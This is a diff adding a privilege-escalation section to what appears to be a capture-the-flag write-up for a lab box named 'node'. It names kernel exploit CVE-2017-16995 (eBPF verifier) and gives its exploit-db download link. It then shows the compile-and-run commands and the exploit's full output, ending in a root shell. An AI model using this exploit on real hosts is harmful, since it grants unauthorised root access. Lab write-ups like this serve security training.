@@ -146,6 +146,48 @@ mark@node:~$ ls -al /home/tom/user.txt
 
 ## Privilege Escalation
 
+### Method 1: kernel exploit cve-2017-16995
+
+Linux exploit suggester shows several kernel vulnerabilities, which all do not work. This however does
+
+```
+[+] [CVE-2017-16995] eBPF_verifier
+
+   Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
+   Exposure: highly probable
+   Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
+   Download URL: https://www.exploit-db.com/download/45010
+   Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1
+```
+
+Copy the file to the target host, rename, compile and execute
+
+```
+mark@node:/tmp$ gcc cve-2017-16995.c -o cve-2017-16995-exploit
+mark@node:/tmp$ chmod a+x cve-2017-16995-exploit 
+mark@node:/tmp$ ./cve-2017-16995-exploit 
+[.] 
+[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
+[.] 
+[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
+[.] 
+[*] creating bpf map
+[*] sneaking evil bpf past the verifier
+[*] creating socketpair()
+[*] attaching bpf backdoor to socket
+[*] skbuff => ffff880027e26700
+[*] Leaking sock struct from ffff88000089a000
+[*] Sock->sk_rcvtimeo at offset 472
+[*] Cred structure at ffff880025664840
+[*] UID from cred structure: 1001, matches the current: 1001
+[*] hammering cred structure at ffff880025664840
+[*] credentials patched, launching shell...
+# whoami
+root
+# ls -al /root/root.txt
+-rw-r----- 1 root root 33 Sep  3  2017 /root/root.txt
+```
+
 
 
 
